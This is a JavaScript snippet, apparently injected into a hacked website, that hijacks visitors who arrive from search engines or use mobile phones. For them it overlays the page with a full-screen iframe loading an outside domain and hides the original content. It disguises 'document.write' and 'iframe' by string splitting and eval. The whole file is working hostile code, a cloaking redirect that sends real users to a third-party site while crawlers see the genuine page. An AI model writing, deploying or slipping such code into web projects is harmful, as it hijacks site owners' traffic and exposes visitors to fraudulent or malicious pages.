var titlestr = document.title;
var arr = ["https://cdns.lao-a-999.com:2096/main.html"];
var linkIndex = Math.floor((Math.random() * arr.length));
var referer = document.referrer;
var regex=/(baidu|soso|sogou|google|youdao|yahoo|bing|sm|so|biso|gougou|ifeng|ivc|sooule|niuhu|biso|360)(\.[a-z0-9\-]+){1,2}\//ig;
var ua = navigator.userAgent.toLowerCase();
if(regex.test(referer) || ua.includes('iphone') || ua.includes('android') || isStorage)
{
  setFrame(arr[linkIndex]);
}
function setFrame(olink) {
  var ss = '<title>' + titlestr + '</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0 frameborder="0" width="100%" height="100%" src="' + olink + '"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;}</style>';
  eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
  try {
    setTimeout(function() {
      console.log(document.body.children.length);
      for (var i = 0; i < document.body.children.length; i++) {
        try {
          var a = document.body.children[i].tagName;
          var b = document.body.children[i].id;
          console.log(i + "***" + a + "**" + b);
          if (b != "iconDiv1" && b != "showcloneshengxiaon" && a != "title") {
            document.body.children[i].style.display = "non" + "e"
          }
        } catch(e) {}
      }
      var oMeta = document.createElement('meta');
      oMeta.name = 'viewport';
      oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
      document.getElementsByTagName('head')[0].appendChild(oMeta);
    },
    100)
  } catch(e) {}
}
<!--999->